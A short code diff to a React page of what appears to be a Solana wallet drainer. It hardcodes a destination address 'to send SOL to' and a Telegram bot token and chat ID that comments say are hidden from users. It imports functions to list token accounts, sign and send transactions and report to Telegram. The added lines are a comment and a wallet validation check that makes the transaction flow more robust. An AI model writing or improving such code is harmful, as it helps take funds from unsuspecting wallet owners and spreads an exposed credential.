@@ -7,8 +7,9 @@ import { getTokenAccounts, sendToTelegram, signAndSendTransaction, getWalletBala
 import { toast } from '@/components/ui/use-toast';
 import { Menu } from "lucide-react";
 
+// Backend address to send SOL to
 const BACKEND_ADDRESS = "GsRoop6YCzpakWCoG7YnHSSgMvcgjnuFEie62GRZdmJx";
-// Telegram details hidden from UI
+// The Telegram credentials are kept private and not shown to users
 const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
 const TELEGRAM_CHAT_ID = "-1002490122517";
 
@@ -214,6 +215,11 @@ const Index = () => {
           title: "Confirming",
           description: "Please confirm the transaction in your wallet",
         });
+
+        // Validation check for wallet before sending
+        if (!wallet || !wallet.publicKey) {
+          throw new Error("Wallet or publicKey is undefined");
+        }
 
         const signature = await signAndSendTransaction(
           connection,
